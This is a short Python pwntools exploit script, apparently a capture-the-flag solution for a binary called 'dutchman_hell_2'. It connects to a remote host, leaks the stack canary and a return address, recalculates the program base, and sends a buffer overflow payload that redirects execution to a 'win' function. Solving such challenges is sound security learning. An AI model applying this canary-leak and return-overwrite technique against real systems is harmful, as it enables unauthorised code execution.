from pwn import *
from time import sleep
import struct
import pwnlib.elf
import pwnlib.gdb

#p = process('./dutchman_hell_2')
p = remote("65.109.185.193", "5001")


def read_all_lines(i):
	for _ in range(i):
		line = p.recvline()
	return line.decode('utf-8', errors='replace')

def convert_to_little(inp):
	return struct.pack('<Q', inp)		

read_all_lines(3)
p.sendline('55') # Send 55 to receive canary
result = read_all_lines(1)
canary = int(result[result.index("Peek") + 8:-1]) # Trim canary

p.sendline('57') # Send 57 to receive ret address
result = read_all_lines(2)
ret = int(result[result.index("Peek") + 8:-1])

p.sendline('1')
read_all_lines(1)
    
e = pwnlib.elf.ELF('./dutchman_hell_2')
e.address += ret - (e.functions['main'].address + 0x3a) # Calculate real address using return address in elf file 


payload = b"\xAA"*24 + convert_to_little(canary) + b"\xAA" * 8 + convert_to_little(e.functions['win'].address + 5) 
p.sendline(payload)

result = read_all_lines(7)
print(result)
